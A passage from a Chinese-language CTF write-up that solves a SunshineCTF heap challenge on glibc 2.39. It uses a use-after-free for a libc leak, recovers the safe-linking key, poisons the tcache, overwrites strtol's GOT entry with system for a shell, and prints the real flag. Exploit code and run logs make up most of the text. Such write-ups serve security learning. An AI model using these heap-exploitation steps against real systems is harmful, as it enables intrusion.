FAKE_INDEX = 2          # slots[2] 指向假 wallet
POISON_SLOT= 6          # 被毒化、ledger 指向 slot 表的 wallet 所在 slot（推導見 §8.3）

OFF_UNSORTED = 0x203b20 # &main_arena.bins[0]（gdb 實測：fd - libc_base）
OFF_SYSTEM   = 0x58740  # Ubuntu 24.04 glibc 2.39 的 system()
LIBC_FP = {...}         # 各 GOT 項目的 offset，用來「指紋比對」確認 libc 版本
```

### 8.1 Phase 1：libc leak（unsorted bin）

```python
open_wallet(b'S', 0x80)         # slot 0
open_wallet(b'D', 0x80)         # slot 1
for i in range(7):
    open_wallet(b'W%d' % i, 0x80)   # slots 2..8
for i in range(2, 9):
    close_wallet(i)             # 7 次 free(0x90) → tcache[0x90] 剛好滿（7/7）
transfer(0, 1)                  # free(S ledger)：tcache 滿 → 往下走 → unsorted bin
leak = withdraw_n(1, 0x80)      # ★ UAF 讀
unsorted = u64(leak[0:8])       # = &main_arena.bins[0]
libc = unsorted - 0x203b20
```

**為什麼會進 unsorted bin？** 0x90 的 chunk 比 `global_max_fast`(0x80) 大，
所以 tcache 滿了之後不會進 fastbin，而是走 normal 路徑 → 丟進 unsorted bin。

**換算公式：**

```
   leak1[0x00..0x08] = main_arena.bins[0] = libc_base + 0x203ac0 + 0x60
   libc_base = leak - 0x203b20
```

### 8.2 Phase 2a：safe-linking key

```python
open_wallet(b'P0', 0x20)   # slot 2
open_wallet(b'P1', 0x20)   # slot 3
open_wallet(b'P2', 0x20)   # slot 4
transfer(2, 3)             # free(P0 ledger, 0x30 chunk) → tcache[0x30] 原本是空的
l    = withdraw_n(3, 0x20) # ★ UAF 讀
safe = u64(l[0:8])         # = (user 位址 >> 12) ^ NULL = user 位址 >> 12  ← safe-linking key
                           #   ★ 是 malloc() 回傳的 user 位址，不是 chunk 標頭（§5.4 實測）
```

> 這裡 **不需要知道 chunk 的完整位址**，因為編碼只用得到 `user 位址 >> 12`
> （key ＝ `&e->next >> 12`，而 `&e->next` 就是 user 位址 = 標頭 + 0x10）。
> 這也讓 exploit 不會因為 heap 佈局（例如 stdio buffer 大小）不同而失敗。

### 8.3 Phase 2b：tcache poisoning

```python
deposit(3, p64(0)*4)              # UAF 寫：把 tcache key 清成 0（同時 next 也歸零）
transfer(3, 4)                    # 對同一塊再 free → double free（靜默通過）→ counts=2
deposit(4, p64(safe ^ SLOTS) + p64(0)*3)
                                  # ★ 寫入 e->next = PROTECT_PTR(e, &slots[0])
                                  #   實際存放值 = (user 位址>>12) ^ 0x4040c0 = safe ^ SLOTS
open_wallet(b'P3', 0x20)          # 第 1 次 malloc(0x20)：拿到 e，並把 entries ← &slots[0]
open_wallet(b'P4', 0x20)          # 第 2 次 malloc(0x20)：★★ 回傳 0x4040c0（slot 表！）
```

`P4` 的 wallet 結構在 heap，但它的 `ledger = 0x4040c0`、`size = 0x20`。
`Open` 裡的 `memset_chk(0x4040c0, 0, 0x20)` 只清掉 `slots[0..3]`，
而 P4 被存進掃描階段就決定好的 slot（>= 4，本例是 slot 6），所以不受影響。

#### `POISON_SLOT = 6` 是怎麼算出來的？

`Open Wallet` 的 slot 掃描**只看 `slots[i] == NULL`**（§4.3 的 `4015e0`），
而且 **`slots[i]` 只有 `Close` 才會被設成 NULL**（`Transfer` 只把 `active` 設 0、
`ledger` 設 NULL，**slot 格子本身沒有清掉**）。把每一步排出來：

```
Open S           → slot 0        （slots[0] 非 NULL）
Open D           → slot 1        （slots[1] 非 NULL）
Open W0..W6      → slots 2..8
Close 2..8       → slots 2..8 全部變 NULL          ← 只有 Close 會清格子
Open P0          → slot 2        （第一個 NULL）
Open P1          → slot 3
Open P2          → slot 4
transfer(2, 3)   → slot2 仍非 NULL！（P0 只是 active=0、ledger=NULL）
Open P3          → slot 5        ← 掃到 5 才空
Open P4          → slot 6        ← ★ 所以 POISON_SLOT = 6
```

`P4` 就是「ledger 被毒化成 `&slots[0]`」的那個 wallet，所以之後
`Deposit(6, ...)` 寫的其實是 slot 表本身，`Withdraw(6, ...)` 讀的是 slot 表。

### 8.4 Phase 3：假 wallet → 任意讀寫

```python
deposit(POISON_SLOT, p64(GOT) + p64(0x70) + p64(FAKE_WALLET) + p64(0))
#  slots[0] = 0x404000 (GOT)   → fake->ledger
#  slots[1] = 0x70             → fake->size
#  slots[2] = 0x4040a8         → 指向假 wallet 自己，同時 fake->active 非 0
got = withdraw_n(FAKE_INDEX, 0x70)     # 任意讀：dump 整個 GOT
```

接著做 **libc 指紋比對**：把 GOT 裡的每個函式位址減掉算出來的 libc base，
和 Ubuntu 24.04 glibc 2.39 的已知 offset 逐一比較：

```
free   +0xadd20      puts    +0x87bd0     write   +0x11c560   read   +0x11ba50
fgets  +0x85b20      calloc  +0xae790     strtol  +0x543c0    malloc +0xad640
setvbuf+0x88540
```

遠端實測**全部吻合** → 確定遠端就是同一個 libc，`system = +0x58740` 可以放心用。

### 8.5 Phase 4：GOT hijack → shell

```python
deposit(POISON_SLOT, p64(STRTOL_GOT) + p64(8) + p64(FAKE_WALLET) + p64(0))
#  重新指定：目標 = 0x404040 (strtol@got)，長度 = 8
deposit(FAKE_INDEX, p64(system))       # ★ 任意寫：strtol@got = system
io.sendline(b'/bin/sh')
#  選單會執行 fgets(buf,0x20); strtol(buf,NULL,10)
#  但 GOT 已經換成 system，rdi = buf = "/bin/sh" → system("/bin/sh") → shell！
```

### 8.6 為什麼 exploit 的 I/O 要「分批」（實戰重點）

這題遠端有 **約 30 秒的連線時限**，而每次 round trip 約 0.3 秒。
原本一步等一下 prompt 的寫法要 35 次往返 ≈ 30 秒 → **剛好在最後一步被切斷**。

所以我把可以合併的輸入全部打包成少數幾次 `send()`：

```python
b  = op_open(...) + op_close(...) + op_transfer(...) + op_withdraw(...) ...
io.send(b)        # 一整包送出去，程式自己照順序吃掉
```

**但是 `Deposit` 不能這樣打包！** 原因見下一節（stdio 的 read-ahead），
所以每個 Deposit 都必須：

```python
io.send(b'2\n' + str(idx).encode() + b'\n')   # 先送「選單選項 + wallet 編號」
io.recvuntil(b'Enter transaction data: ')     # 等它印出提示
io.send(payload + trailing)                   # 才送 raw payload
```

---

## 9. 實際執行結果

### 9.1 本地（`./flag.txt` 放假的 flag）

```
$ python3 exploit.py
[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2'
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2': pid 3544551
[+] unsorted bin head : 0x7fb8b5a03b20
[+] libc base         : 0x7fb8b5800000
[+] safe-linking key  : 0x555569c11
[+] libc fingerprint  : Ubuntu glibc 2.39 (all GOT entries match)
[+] system() = 0x7fb8b5858740
[+] Deposited 8 bytes. New balance: 8      ← ★ 程式印的（Deposit 成功）

--- MAIN MENU ---                          ← ★ 程式又跑了一輪選單
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>> sun{LOCAL_TEST_FLAG}                   ← 從這裡開始是我們的 shell 指令輸出
total 2500
drwxr-xr-x  3 kzzz kzzz    4096 Sep 28 01:03 .
... （ls -la 的其餘行省略）
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_TEST_FLAG}
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2' (pid 3544551)
```

> 💡 **新手最容易以為「我跑壞了」的四件事**：
> 1. 開頭那兩行 `[x] Starting local process ...` / `[+] Starting local process ...: pid NNNN`
>    是 **pwntools** 印的（每次 pid、位址都不同），不是程式輸出。
> 2. `[+] Deposited 8 bytes. New balance: 8` 與整段 `MAIN MENU` 是**程式自己**印的
>    （`Deposit` 的訊息 + 選單迴圈又跑一輪）。
> 3. `DONE` 後面若出現奇怪的空白／殘留字元是正常的（free 過的 chunk 內還留著舊資料）。
> 4. 恆等式檢查：`unsorted - libc = 0x203b20`
>    （`0x7fb8b5a03b20 - 0x7fb8b5800000` ✔）、`system - libc = 0x58740`
>    （`0x7fb8b5858740 - 0x7fb8b5800000` ✔）。你的數字一定不同，但**差值**必須一樣。

### 9.2 遠端（真實 flag）

```
$ python3 exploit.py REMOTE
[x] Opening connection to chal.sunshinectf.games on port 26004
[x] Opening connection to chal.sunshinectf.games on port 26004: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26004: Done
[+] unsorted bin head : 0x74d24f3e9b20
[+] libc base         : 0x74d24f1e9000
[+] safe-linking key  : 0x2e22b
[+] libc fingerprint  : Ubuntu glibc 2.39 (all GOT entries match)
[+] system() = 0x74d24f241740
[+] Deposited 8 bytes. New balance: 8

--- MAIN MENU ---
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>> sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
total 12
drwxr-xr-x 2 root root        4096 Sep 26 00:21 .
drwxr-xr-x 1 root root        4096 Sep 26 00:54 ..
-rw-r----- 1 root cache_money   40 Sep 26 00:13 flag.txt
uid=1337(cache_money) gid=1337(cache_money) groups=1337(cache_money)
DONE


FLAG: sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
[*] Closed connection to chal.sunshinectf.games port 26004
```

> 💡 **遠端連線 pwntools 會印「兩行」**：
> `[x] Opening connection ...: Trying 35.211.211.18`（開始嘗試）與
> `[+] Opening connection ...: Done`（成功）。只看到一行不代表只做了一次動作。
> `libc fingerprint : ... all GOT entries match` 代表 11 個 GOT 項目扣掉我們的 libc base
> 之後**全部命中**已知 offset → 確認遠端就是同一份 2.39 libc（不是硬猜 offset）。

**真實 flag：`sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}`**

---

## 10. 常見坑（我實際踩過的都列在這）

### 坑 1 ★★★：`fgets` 的 read-ahead 會「吃掉」raw `read()` 的 payload

這是我卡最久的一個，非常值得學：

- `Deposit` 用的是 **raw `read(0, ptr, size)`**（fd 直接讀）。
- 其他操作用的是 **`fgets`**，而 `fgets` 底層是 stdio：第一次讀會
  `read(0, stdio_buf, 4096)` **一次讀一大塊**進來（read-ahead）。
- 如果我們把 `"2\n3\n" + <32 bytes payload>` 一次送出去，
  程式在處理選單的 `fgets` 時就會把**全部 38 bytes 吸進 stdio 緩衝區**，
  之後的 `read(0, ptr, 32)` 去 kernel 拿資料時**什麼都沒有** → 卡住等待。

**解法**：raw payload 一定要**看到對應的提示之後才送**
（`Enter transaction data: ` 是在 `read()` 之前印出的，此時 fgets 已經讀完）。

同一個坑也會發生在「拿到 shell 之後」：`system("/bin/sh")` 之前如果
把 shell 指令跟 `/bin/sh` 黏在同一個封包送出，指令會被程式的 stdio 吞掉，
shell 什麼都收不到 → 所以要先送 `/bin/sh`，等一下，再送指令。

### 坑 2：tcache 最多 7 個（而且會被「開新 wallet」偷偷消耗）

第一次寫的時候我「開 8 個 wallet 再關 7 個」想填滿 tcache，
結果 transfer 之後 free 的 chunk 竟然還是進了 tcache（`next` 看起來像明文）。

原因：**`Open Wallet` 的 `malloc(size)` 會從 tcache 拿走一個**！
正確做法是「先開好 source/destination，再另外開 7 個來關」。

### 坑 3：遠端有 30 秒連線時限

```
[10.5s] alive ... [28.6s] alive ... [30.2s] CONNECTION DEAD
```
每次往返 0.3s × 35 次 ≈ 30s → 必須批次化輸入（見 §8.6）。

### 坑 4：glibc 版本差異

- `__free_hook` / `__malloc_hook` 在 **2.34+ 已移除** → 老教學的招式不能用。
- safe-linking 從 **2.32** 開始，`next` 是編碼過的，直接寫入目標位址會 crash。
- `tcache->counts` 在 2.30+ 是 **uint16_t**（一個 2 bytes），不是 1 byte，
  用 gdb 讀 `counts` 時要看對大小，不然會以為 offset 算錯。
- tcache double free 檢查（`e->key == tcache_key`）從 **2.29** 開始。
- 不同 libc patch 的 `system` / `main_arena` offset 可能不同 →
  **一定要用 leak 反推 libc base，並用 GOT 指紋確認版本**，千萬不要硬寫死。

### 坑 5：`malloc` 的對齊要求

glibc 2.32+ 的 `tcache_get` 有：
```c
if (__unlikely(!aligned_OK(e))) malloc_printerr("malloc(): unaligned tcache chunk detected");
```
`aligned_OK` 要求 **16 bytes 對齊**。`0x4040c0` 剛好是 16 的倍數所以過關；
若毒化的目標位址不是 16 對齊就會直接 abort。

### 坑 6：canary 檢查的時機

每個函式在 `ret` 前才檢查（`sub rax, fs:0x28`）。
本題我們完全不去改 stack，所以 canary 沒有影響；
但如果想改用 ROP，就必須先 leak stack（例如讀 libc 的 `environ`）
或想辦法不動到 canary。

### 坑 7：`read()` 短讀（short read）

`socket`/`pipe` 上的 `read()` 回傳「目前可用的位元組數」，不保證等於你要的長度。
本題 exploit 都只送很小的封包（< MSS），而且用 `recvuntil` 同步，
所以實際上不會短讀；但如果是自動化大量輸出，建議驗證
`[+] Deposited N bytes` 的 N 是否等於預期（我的第一版就有寫這個檢查）。

### 坑 8：`assert` 過嚴導致誤判

我一開始寫 `assert leak >> 40 == 0x7f`，本地過、遠端失敗——
因為遠端 ASLR 把 libc 放在 `0x70...`！
正確的檢查是「頁對齊」與「低 12 bits 符合已知 offset」，而不是位址前綴。

---

## 11. 一頁總結

```
漏洞：Transfer(4) 會 free(src->ledger)，然後把「那個已 free 的指標」
      存進 dst->ledger，並讓 dst 保持 active → use-after-free +
      可連鎖觸發的 double free。

利用：UAF 讀 unsorted bin    → libc base       （偏移 0x203b20）
      UAF 讀空 tcache 鏈頭   → user 位址 >> 12  （safe-linking key；＝&e->next >> 12）
      UAF 寫清 tcache key + double free + 毒化 next
      → 第二次 malloc(0x20) 回傳 0x4040c0（slot 表）
      → 用 .bss 的假 wallet（0x4040a8）取得任意讀寫
      → strtol@got = system → 輸入 /bin/sh → shell
      → cat flag.txt → sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
```
